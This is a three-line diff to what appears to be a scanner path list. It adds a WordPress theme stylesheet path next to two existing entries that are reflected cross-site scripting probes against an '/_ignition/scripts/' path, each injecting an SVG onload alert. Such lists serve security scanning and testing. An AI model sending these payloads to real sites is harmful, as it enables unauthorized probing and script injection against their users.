@@ -1,2 +1,3 @@
 /_ignition/scripts/--><svg%20onload=alert(document.domain)>
 /_ignition/scripts/--><svg%20onload=alert(1337)>
+/wp-content/themes/ignition/style.css
